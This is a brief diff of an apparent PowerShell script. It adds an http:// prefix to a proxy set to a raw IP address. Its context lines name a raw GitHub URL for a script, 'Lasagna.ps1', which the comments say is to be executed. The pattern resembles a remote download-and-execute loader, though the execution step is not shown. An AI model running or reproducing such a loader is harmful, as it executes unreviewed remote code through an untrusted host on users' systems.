@@ -1,5 +1,5 @@
 # Set the HTTP proxy server information (replace with your proxy server details)
-$proxyServer = "43.157.8.79:8888"
+$proxyServer = "http://43.157.8.79:8888"
 
 # Set the URL of the script you want to execute
 $scriptURL = "https://raw.githubusercontent.com/MarkDenkmn/MarkDenkmn/main/Lasagna.ps1"
